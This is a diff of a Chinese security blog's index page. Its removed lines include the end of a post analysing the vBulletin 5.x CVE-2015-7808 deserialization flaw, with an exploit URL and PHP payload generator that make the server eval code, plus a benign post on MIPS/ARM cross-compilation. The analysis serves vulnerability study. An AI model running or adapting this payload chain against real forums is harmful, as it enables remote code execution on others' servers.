-<p><code>http://172.17.0.3/ajax/api/hook/decodeArguments?arguments=O%3A7%3A%22vB_vURL%22%3A1%3A%7Bs%3A7%3A%22tmpfile%22%3BO%3A16%3A%22vB_View_AJAXHTML%22%3A2%3A%7Bs%3A7%3A%22tmpfile%22%3BN%3Bs%3A10%3A%22%00%2A%00content%22%3BO%3A12%3A%22vB5_Template%22%3A3%3A%7Bs%3A7%3A%22tmpfile%22%3BN%3Bs%3A11%3A%22%00%2A%00template%22%3Bs%3A10%3A%22widget_php%22%3Bs%3A13%3A%22%00%2A%00registered%22%3Ba%3A1%3A%7Bs%3A12%3A%22widgetConfig%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22phpinfo%28%29%3Bdie%28%29%3B%22%3B%7D%7D%7D%7D%7D</code></p>
-<p>输出序列化值的代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">vB5_Template</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $tmpfile;</span><br><span class="line">        <span class="keyword">protected</span> $template;</span><br><span class="line">        <span class="keyword">protected</span> $registered = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = <span class="string">'widget_php'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;registered[<span class="string">'widgetConfig'</span>] = <span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="string">'phpinfo();die();'</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">vB_View_AJAXHTML</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $tmpfile;</span><br><span class="line">        <span class="keyword">protected</span> $content;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;content = <span class="keyword">new</span> vB5_Template();</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">vB_vURL</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $tmpfile;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tmpfile = <span class="keyword">new</span> vB_View_AJAXHTML();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_vURL())) . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>最终输出的是 <code>serialize(new vB_vURL())</code>的值，向类vB_vURL注入了一个public变量<code>$temfile</code>，并且赋值为类<code>vB_View_AJAXHTML</code>，而类<code>vB_View_AJAXHTML</code>的构造函数中，向其类内对象<code>$content</code>赋值类<code>vB5_Template</code>，最终的利用代码在类<code>vB5_Template</code>中<code>$templete</code>和<code>$registered</code>中，含义分别是调用模板<code>widget_php</code>和<code>$registered[&#39;widgetConfig&#39;]</code>的值为利用代码。</p>
-<p>代码执行的效果如下：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin17.png" alt="vbulletin17"></p>
-<p>下面调试分析一下：</p>
-<p>首先进入<code>core/vb/api/hook.php</code>文件的<code>vB_Api_Hook</code>类的<code>decodeArguments</code>方法，传入的值会被进行反序列化操作。变量<code>$args</code>会被赋值为<code>vB_vURL</code>类。</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin18.png" alt="vbulletin18"></p>
-<p>在foreach中，由于<code>$args</code>为对象数据结构，并且当前类（<code>vB_vURL</code>类）并没有<code>implements Iterator</code>接口，因此当php在遍历对象<code>$args</code>时，只是会遍历<code>vB_vURL</code>类的public变量，不会产生漏洞。</p>
-<p>由于要进行return操作，因此便出发了当前类（<code>vB_vURL</code>类）的析构函数。</p>
-<p><code>core/vb/vurl.php</code>下的<code>__destruct</code>函数。</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin19.png" alt="vbulletin19"></p>
-<p>由于为其<code>$tmpfile</code>赋值为一个对象，<code>file_exists</code>方法会试图把类转化为字符串，因此触发了<code>$tmpfile</code>对象的<code>__toString()</code>方法。（<strong>由于传入的是vB_View_AJAXHTML类，vB_View_AJAXHTML类继承于vB_View类，因此触发的是vB_View类的__toString方法</strong>）</p>
-<p><code>core/vb/view.php</code>下的<code>__toString</code>函数：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin20.png" alt="vbulletin20"></p>
-<p>由上文可知，当前<code>$this</code>对象其实还是<code>vB_View_AJAXHTML</code>类的对象，因此进入了<code>vB_View_AJAXHTML</code>类的<code>render()</code>方法，由于定义了<code>vB_View_AJAXHTML</code>类的<code>$content</code>类对象。</p>
-<p><code>core/vb/view/ajaxhtml.php</code>下<code>render</code>函数：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin21.png" alt="vbulletin21"></p>
-<p>类对象<code>$content</code>已经被赋值为<code>vB5_Template</code>类对象，因此会进入<code>vB5_Template</code>类的<code>render()</code>方法。</p>
-<p><code>includes/vb5/template.php</code>下<code>render</code>函数：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin22.png" alt="vbulletin22"></p>
-<p><code>vB5_Template</code>类的<code>render()</code>方法，此方法会执行<code>extract()</code>方法和<code>eval()</code>方法，并且都可以控制传入的参数，因此会导致代码执行。执行完<code>extract</code>之后，变量值如下：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin23.png" alt="vbulletin23"></p>
-<p>获取<code>template</code>的代码：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin25.png" alt="vbulletin24"></p>
-<p><code>widget_php</code>模板代码在数据库<code>template</code>表中，导出之后，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;canvas-widget default-widget custom-html-widget&quot; id&#x3D;&quot;widget_&#39; . $widgetinstanceid . &#39;&quot; data-widget-id&#x3D;&quot;&#39; . $widgetid . &#39;&quot; data-widget-instance-id&#x3D;&quot;&#39; . $widgetinstanceid . &#39;&quot;&gt;</span><br><span class="line">\</span><br><span class="line">\	&#39; . vB_Template_Runtime::includeTemplate(&#39;module_title&#39;,array(&#39;widgetConfig&#39; &#x3D;&gt; $widgetConfig, &#39;can_use_sitebuilder&#39; &#x3D;&gt; $user[&#39;can_use_sitebuilder&#39;])) . &#39;</span><br><span class="line">\</span><br><span class="line">\	&lt;div class&#x3D;&quot;widget-content&quot;&gt;</span><br><span class="line">\</span><br><span class="line">\	\	&lt;hr class&#x3D;&quot;widget-header-divider&quot; &#x2F;&gt;</span><br><span class="line">\</span><br><span class="line">\	\	&#39; . &#39;&#39;; if (!empty($widgetConfig[&#39;code&#39;]) AND !vB::getDatastore()-&gt;getOption(&#39;disable_php_rendering&#39;)) &#123;\</span><br><span class="line">\	\	\	\	\	$final_rendered .&#x3D; &#39;</span><br><span class="line">\</span><br><span class="line">\	\	\	&#39; . &#39;&#39;; $evaledPHP &#x3D; vB_Template_Runtime::parseAction(&#39;bbcode&#39;, &#39;evalCode&#39;, $widgetConfig[&#39;code&#39;]); $final_rendered .&#x3D; &#39;&#39; . &#39;</span><br><span class="line">\</span><br><span class="line">\	\	\	&#39; . $evaledPHP . &#39;</span><br><span class="line">\</span><br><span class="line">\	\	&#39;;\</span><br></pre></td></tr></table></figure>
-
-<p>继续往下执行：</p>
-<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin24.png" alt="vbulletin25"></p>
-<p>这样就引发代码执行。</p>
-<p>参考文献：</p>
-<p>1.<a href="https://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/" target="_blank" rel="noopener">https://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/</a></p>
-<p>2.<a href="http://blog.nsfocus.net/vbulletin-5-rce-vulnerability/" target="_blank" rel="noopener">http://blog.nsfocus.net/vbulletin-5-rce-vulnerability/</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2020/04/20/ARM%E3%80%81MIPS%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E8%AF%95%E7%94%A8%E5%B0%8F%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpeg">
-      <meta itemprop="name" content="n0maj1o24">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Technical Memorandum">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/04/20/ARM%E3%80%81MIPS%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E8%AF%95%E7%94%A8%E5%B0%8F%E8%AE%B0/" class="post-title-link" itemprop="url">ARM、MIPS交叉编译工具试用小记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-04-19 17:20:52" itemprop="dateCreated datePublished" datetime="2020-04-19T17:20:52Z">2020-04-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-22 10:20:50" itemprop="dateModified" datetime="2021-04-22T10:20:50Z">2021-04-22</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/04/20/ARM%E3%80%81MIPS%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E8%AF%95%E7%94%A8%E5%B0%8F%E8%AE%B0/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/04/20/ARM%E3%80%81MIPS%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E8%AF%95%E7%94%A8%E5%B0%8F%E8%AE%B0/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>  最近，研究了一下交叉编译技术。主要涉及的语言包括<code>Go</code>和<code>C</code>。其中<code>Go</code>的交叉编译相对来说比较容易，<code>C</code>的交叉编译在环境配置上有一些难度和繁琐。在研究过程中，踩了不少坑，特此记录。</p>
-<p><code>Go</code>语言的交叉编译比较容易，基本上就是参数上设置正确就OK了。静态编译的时候，可执行文件相对比较大，这在<code>MIPS</code>设备中，会有些不适合。因为<code>MIPS</code>设备存储容量比较小，内存也比较小，如果静态编译出来的文件过大，可能无法下载到设备中，更有甚者无法加载可执行文件，这种情况基本上就只能靠<code>C</code>语言来进行交叉编译可执行文件了。<code>Go</code>交叉编译的情况，可以参考<a href="https://github.com/eyasliu/blog/issues/27" target="_blank" rel="noopener">链接1</a>所示，我觉得写的不错。对于<code>Go</code>支持的操作系统和具体版本，可以参考<a href="https://github.com/golang/go/wiki" target="_blank" rel="noopener">Github Go wiki</a>。如关于<code>ARM</code>的<a href="https://github.com/golang/go/wiki/GoArm" target="_blank" rel="noopener">链接2</a>，关于<code>MIPS</code>的<a href="https://github.com/golang/go/wiki/GoMips" target="_blank" rel="noopener">链接3</a>.</p>
-<p>  主要来讲<code>C</code>的交叉编译，毕竟坑多，配置繁琐。</p>
-<p>  我使用过的交叉编译工具或者环境如下：<code>dockcross</code>,<code>Buildroot</code>,<code>crosstool-NG</code>.</p>
-<p><code>dockcross</code>相对来说简单方便，基于<code>docker</code>，能够满足一般需求。可以参考<a href="https://github.com/dockcross/dockcross" target="_blank" rel="noopener">链接4</a>.</p>
-<p>  我这里出现的情况是，<code>dockcross</code>解决不了我面临的现实问题。静态编译的可执行文件在设备上运行的时候，提示<code>kernel old</code>错误。这里的原因是<code>dockcross-arm docker</code>采用的<code>linux</code>内核版本太高，其实动态编译得到的可执行程序是能在设备上执行成功的。<code>glibc</code>向下兼容，所以执行成功了。这是我后续测试发现的。动态编译文件还小，如果能够跑起来，其实动态编译就好了。因为内核版本高了，那就找个内核版本和设备差不多的。然而，<code>dockcross</code>构建的<code>docker</code>镜像里，没有符合我要求的。</p>
-<p>  遇到问题，那就解决问题。找到<a href="https://buildroot.org/" target="_blank" rel="noopener">Buildroot</a>，看着口号是让嵌入式<code>linux</code>环境构建更加容易。我下载了最新版，看了一下说明文档，配置起来果然方便。<code>make menuconfig</code>进行配置，然后<code>make</code>就可以了。<code>make menuconfig</code>选择它支持的<code>kernel</code>版本，有个小坑。虽然配置选项可以选择<code>kernel 2.6.x</code>版本，但是在<code>make</code>的时候，下载<code>kernel</code>的时候会出现404错误。<code>buildroot</code>官方的<a href="http://sources.buildroot.net/linux/" target="_blank" rel="noopener">下载地址</a>已经没有<code>2.6.x</code>版本的内核了，最低版本是<code>3.2.101</code>。如果选择了<code>2.6.x</code>版本的<code>kernel</code>，需要让其到<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">cdn.kernel</a>网站上去下载对应文件，主要是参考<code>cdn.kernel</code>网站上，对应<code>kernel</code>文件名，填入<code>URL of custom kernel tarball</code>中。<code>C</code>运行库有<code>uClibc</code>、<code>glibc</code>、<code>musl</code>可以选择。<code>glibc</code>编译出来的静态文件相对较大，<code>uClibc</code>编译出来的静态文件相对较小，优先选择<code>uClibc</code>，<code>musl</code>我暂时还没用到，这里不评价。</p>
-<p><a href="https://crosstool-ng.github.io/" target="_blank" rel="noopener">crosstool-NG</a>本来想用，后来看到<code>Buildroot</code>解决了我的问题，就把它暂时搁置了。看着<code>crosstool-NG</code>配置和<code>Buildroot</code>大同小异，这里占个位置，后续使用到了，再来填坑。</p>
-<p>  其实，最后我还用到了<code>qemu-mips-static</code>来加载<code>uClibc</code>。因为我遇到一个很老的<code>MIPS</code>系统，内核版本是<code>2.4.x</code>，这在<code>dockcross</code>构建的环境里面没有，<code>Buildroot</code>高版本已经不支持<code>kernel2.4.x</code>了。使用高版本的<code>kernel</code>进行构建交叉编译工具，最后编译出来的可执行程序在设备上跑不起来，问题如下：</p>
-<p><code>line 1: syntax error: unexpected “(”</code></p>
-<p>  我琢磨还是内核版本不兼容导致的。最直接的版本就是安装一个内核版本相同的系统，然后进行交叉编译。说干就干。</p>
-<p>  尝试安装<code>ubuntu6.06.1</code>、<code>redhat 9.0</code>这些古老的<code>linux</code>系统结合<code>buildroot-0.9.27</code>来交叉编译，很不幸老旧的<code>linux</code>发行版不支持包更新了，我只能断了这个念头。无意中我在<a href="https://www.uclibc.org/toolchains.html" target="_blank" rel="noopener">uClibc</a>官网发现可以挂载编译好的基于<code>Buildroot-0.9.27</code>的<code>uClibc</code>来进行交叉编译任务。我真是喜出望外，其实是我没仔细看官网，不然前面安装老旧版本的<code>linux</code>工作就可以免了。uClibc官网的下载地址挂了，用这个<a href="https://cdn.kernel.org/pub/linux/libs/uclibc/" target="_blank" rel="noopener">地址</a>下载吧。以<code>root_fs_mips</code>为例，来进行挂载。主要命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bunzip2 root_fs_mips.bz2</span><br><span class="line">mkdir root_fs_mips</span><br><span class="line">sudo su</span><br><span class="line">mount -o loop root_fs_mips.ext2 root_fs_mips</span><br><span class="line">chroot root_fs_mips /bin/bash -</span><br></pre></td></tr></table></figure>
-
-<p>  这里有个小坑，因为本机是<code>linux</code>，在挂载<code>root_fs_mips</code>的时候出现如下错误：</p>
-<p><code>chroot: failed to run command &#39;/bin/bash&#39;: Exec format error</code></p>
-<p>  原因是系统架构不同导致的错误。解决办法就是借助<code>qemu-mips-static</code>。<code>qemu</code>的安装如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install qemu-user-static</span><br></pre></td></tr></table></figure>
-
-<p>  最后借助<code>qemu_mips_static</code>挂载<code>root_fs_mips</code>的命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/qemu-mips-static root_fs_mips/usr/bin</span><br><span class="line">chroot root_fs_mips qemu-mips-static /bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>  对于老旧版本的<code>MIPS</code>，这样进行交叉编译待执行程序，就可以解决问题了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1892,20 +1828,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-count">25</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1940,7 +1876,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
